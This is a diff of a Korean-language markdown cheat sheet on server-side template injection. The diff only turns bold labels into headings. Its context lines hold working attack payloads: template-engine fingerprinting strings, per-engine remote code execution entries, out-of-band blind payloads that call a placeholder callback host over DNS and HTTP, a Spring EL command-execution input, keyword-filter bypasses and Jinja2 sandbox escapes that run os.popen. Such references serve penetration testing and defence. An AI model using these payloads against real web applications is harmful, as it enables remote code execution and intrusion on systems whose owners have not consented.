@@ -1,6 +1,6 @@
 ### 기본 페이로드
 
-**엔진 식별 (수학 연산):**
+#### 엔진 식별 (수학 연산)
 
 | 페이로드 | 결과 | 엔진 |
 |---|---|---|
@@ -16,7 +16,7 @@
 | `{php}echo 7*7;{/php}` | `49` | Smarty |
 | `@(7*7)` | `49` | Razor (.NET) |
 
-**엔진별 RCE:**
+#### 엔진별 RCE
 
 | 엔진 | 페이로드 |
 |---|---|
@@ -42,7 +42,7 @@
 | Liquid (Shopify) | sandbox 강함 — 일반적 RCE 어려움 |
 | Mustache | logic-less — RCE 불가 (Handlebars 커스텀 helper만) |
 
-**OOB Blind:**
+#### OOB Blind
 ```
 # DNS callback (Jinja2)
 {{request.application.__globals__.__builtins__.__import__('socket').gethostbyname('CALLBACK.oast.fun')}}
@@ -54,7 +54,7 @@
 ${"freemarker.template.utility.ObjectConstructor"?new()("java.net.URL","https://CALLBACK/ssti").openStream()}
 ```
 
-**SpringEL view name 평가 (CVE-2022-22965 계열):**
+#### SpringEL view name 평가 (CVE-2022-22965 계열)
 ```
 return "redirect:" + userInput;  // userInput이 "${T(java.lang.Runtime).getRuntime().exec('id')}"
 ```
@@ -78,7 +78,7 @@ return "redirect:" + userInput;  // userInput이 "${T(java.lang.Runtime).getRunt
 | 단일 keyword 필터 (`os`) | `os['__class__']`, `__import__('o'+'s')`, `getattr(__builtins__, 'o'+'s')` |
 | `request` 차단 | `cycler`, `lipsum`, `config`, `joiner` 같은 다른 globals 객체 |
 
-**Jinja2 sandbox bypass (대표 변형):**
+#### Jinja2 sandbox bypass (대표 변형)
 ```
 {{cycler.__init__.__globals__.os.popen('id').read()}}
 {{lipsum.__globals__['os'].popen('id').read()}}
